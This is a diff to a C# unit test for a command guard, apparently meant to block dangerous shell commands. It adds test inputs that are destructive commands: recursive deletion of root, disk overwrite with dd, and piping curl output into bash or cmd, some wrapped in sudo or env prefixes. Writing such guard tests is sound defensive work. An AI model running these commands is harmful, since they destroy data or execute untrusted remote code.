@@ -64,6 +64,12 @@ public class DangerousCommandGuardTests
     [InlineData("del /f /s C:\\")]
     [InlineData("bash <(curl -sL url)")]
     [InlineData("curl x | 'bash'")]
+    [InlineData("sudo -u root rm -rf /")]
+    [InlineData("sudo -u root dd if=/dev/urandom of=/dev/sdb")]
+    [InlineData("FOO=bar rm -rf /")]
+    [InlineData("FOO=bar dd if=/dev/urandom of=/dev/sdb")]
+    [InlineData("env -u FOO rm -rf /")]
+    [InlineData("curl http://x | cmd /c start")]
     public void Check_CatastrophicPatterns_ShouldReject(string command)
     {
         DangerousCommandGuard.Check(command, Default()).Should().NotBeNull();
